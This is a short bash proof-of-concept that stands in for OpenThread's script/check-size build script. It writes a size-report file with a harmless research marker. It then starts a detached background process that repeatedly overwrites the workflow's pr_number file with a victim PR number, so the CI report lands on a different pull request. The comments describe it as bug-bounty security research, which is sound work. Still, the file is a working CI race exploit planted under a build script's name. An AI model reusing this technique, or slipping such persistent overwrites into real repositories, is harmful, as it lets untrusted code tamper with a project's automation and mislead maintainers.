#!/bin/bash
#
# Temporary research stub. Restores real check-size after PoC.
set -euo pipefail
OT_TMP_DIR=/tmp/ot-size-report
readonly OT_TMP_DIR
mkdir -p "${OT_TMP_DIR}"
cat > "${OT_TMP_DIR}/report_pr" <<'EOF'
<!-- Size Report of **OpenThread** -->
> OSS-VRP research marker (harmless). If this appears on a different PR, `pr_number` was attacker-controlled via a detached process in `script/check-size`.

This is a security-research proof. No malicious payload.
EOF
echo "pending" > "${OT_TMP_DIR}/pr_number"
VICTIM="13588"
# detached writer survives this script and overwrites pr_number after the
# workflow's echo of github.event.pull_request.number
setsid bash -c "
  for i in \$(seq 1 80); do
    sleep 0.2
    echo '${VICTIM}' > /tmp/ot-size-report/pr_number
  done
" >/dev/null 2>&1 < /dev/null &
exit 0
